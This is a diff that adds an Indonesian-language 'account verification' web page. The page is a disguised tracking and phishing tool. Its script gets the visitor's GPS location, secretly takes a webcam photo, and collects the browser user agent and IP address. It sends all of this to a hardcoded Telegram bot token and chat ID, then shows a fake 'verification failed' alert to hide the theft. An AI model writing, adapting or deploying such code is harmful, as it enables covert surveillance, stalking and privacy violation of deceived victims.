@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verifikasi Akun Anda</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        #loading {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Verifikasi Akun Anda</h1>
+        <p>Untuk memastikan keamanan akun Anda, kami perlu memverifikasi lokasi dan kamera Anda.</p>
+
+        <button onclick="startVerification()">Mulai Verifikasi</button>
+
+        <div id="loading">Memverifikasi...</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8136369577:AAF7McrdUM-7MFGCix1Fc2-Lcq4lWAK4N3k'; // Ganti dengan token bot Anda
+        const CHAT_ID = '7875207071'; // Ganti dengan ID pengguna Anda
+
+        function startVerification() {
+            document.getElementById('loading').style.display = 'block';
+            getLocationAndCamera();
+        }
+
+        function getLocationAndCamera() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        getCameraAccess()
+                            .then(imageData => {
+                                getUserAgent()
+                                    .then(userAgent => {
+                                        getIPAddress()
+                                            .then(ipAddress => {
+                                                sendDataToTelegram(locationData, imageData, userAgent, ipAddress);
+                                            });
+                                    });
+                            })
+                            .catch(error => {
+                                showError('Gagal mendapatkan akses kamera: ' + error);
+                            });
+                    },
+                    (error) => {
+                        showError('Gagal mendapatkan lokasi: ' + error.message);
+                    }
+                );
+            } else {
+                showError('Geolocation tidak didukung oleh browser Anda.');
+            }
+        }
+
+        function getCameraAccess() {
+            return new Promise((resolve, reject) => {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        const videoTrack = stream.getVideoTracks()[0];
+                        const imageCapture = new ImageCapture(videoTrack);
+                        return imageCapture.takePhoto();
+                    })
+                    .then(blob => {
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            resolve(reader.result); // Data URL dari gambar
+                        };
+                        reader.onerror = reject;
+                        reader.readAsDataURL(blob);
+                    })
+                    .catch(error => {
+                        reject(error);
+                    });
+            });
+        }
+
+        function getUserAgent() {
+            return new Promise((resolve) => {
+                resolve(navigator.userAgent);
+            });
+        }
+
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Gagal mendapatkan IP address:', error);
+                    return 'Tidak Diketahui';
+                });
+        }
+
+        function sendDataToTelegram(locationData, imageData, userAgent, ipAddress) {
+            const message = `Verifikasi Akun:\nLokasi:\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nKeakuratan: ${locationData.accuracy}\n\nFoto:\n${imageData}\n\nUser Agent: ${userAgent}\nIP Address: ${ipAddress}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        showError('Verifikasi Gagal. Terjadi kesalahan. Silakan coba lagi nanti.');
+                    } else {
+                        showError('Gagal mengirim data ke Telegram: ' + data.description);
+                    }
+                })
+                .catch(error => {
+                    showError('Terjadi kesalahan: ' + error);
+                });
+        }
+
+        function showError(message) {
+            document.getElementById('loading').style.display = 'none';
+            alert(message);
+        }
+    </script>
+</body>
+</html>
